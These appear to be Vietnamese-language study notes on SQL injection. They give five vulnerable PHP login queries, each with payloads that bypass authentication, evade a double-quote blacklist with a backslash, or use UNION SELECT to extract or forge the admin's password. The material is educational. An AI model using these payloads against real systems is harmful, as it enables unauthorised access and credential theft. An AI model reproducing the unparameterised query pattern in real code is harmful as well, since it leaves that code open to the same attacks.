## Example

### Example 1

```
$sql = "SELECT username FROM users WHERE username='$username' AND password='$password'";
$query = $database->query($sql);
```

C1: Truyền dữ liệu `admin' -- ` vào biến username.

C2: Truyền dữ liệu `admin' or 1 = '2`.

Giải thích: toán tử AND sẽ được ưu tiên thực hiện trước toán tử OR. Nên ta có logic của câu truy vấn như sau: TRUE OR (FALSE AND FALSE) --> TRUE OR FALSE = TRUE --> login thành công.

 ### Example 2

 ```
$sql = "SELECT username FROM users WHERE username=\"$username\" AND password=\"$password\"";
$query = $database->query($sql);
```

Tương tự ex 1 nhưng lần này biến $username và $password được bọc trong dấu nháy kép. 

C1: Truyền dữ liệu `admin" -- ` vào biến username.

C2: Truyền dữ liệu `admin" or 1 = "2`.

### Example 3

```
$sql = "SELECT username FROM users WHERE username=LOWER(\"$username\") AND password=MD5(\"$password\")";
$query = $database->query($sql);
```

Có sự xuất hiện của hàm LOWER(). Cách khai thác:

Cách khai thác: `admin" ) -- `.

### Example 4

```
function checkValid($data)
{
    if (strpos($data, '"') !== false)
        return false;
    return true;
}

function loginHandler($username, $password)
{
    if (!checkValid($username) || !checkValid($password))
        return "detected";
....

    $sql = "SELECT username FROM users WHERE username=LOWER(\"$username\") AND password=MD5(\"$password\")";
    $query = $database->query($sql);
```

Ở ví dụ này chương trình đưa dấu nháy kép " vào blacklist. Vì vậy hãy sử dụng dấu backslash `\` để loại bỏ dấu " trong câu truy vấn. Cách khai thác:

Ở trường username nhập: `\`. Như vậy username sẽ nhận giá trị `) AND password=MD5(`.

Ở trường password thực hiện nối dài câu truy vấn để khai thác sqli: `) union select 'admin' -- `.

Lúc này câu truy vấn sẽ trở thành: `SELECT username FROM users WHERE username=LOWER() AND password=MD5() UNION SELECT 'admin' -- `

### Example 5

```
$sql = "SELECT username, password FROM users WHERE username='$username'";
```

Truy vấn giá trị username và password từ database nơi mà usernmae bằng giá trị biến $username nhập vào. password nhập vào sẽ được hash md5 trước khi so sánh với password truy vấn trước đó.

Cách khai thác: nối dài câu truy vấn với `union`.

C1: Truyền dữ liệu vào biến username: `' UNION SELECT password, md5('1') from users where username = 'admin' -- `. Password: `1`. Bằng cách này sẽ lấy được được password của admin từ database.

C2: Cách này sẽ thao túng luôn password và đăng nhập với tư cách admin với bất kì password nào. `' UNION SELECT 'admin', md5('1') -- `.





 

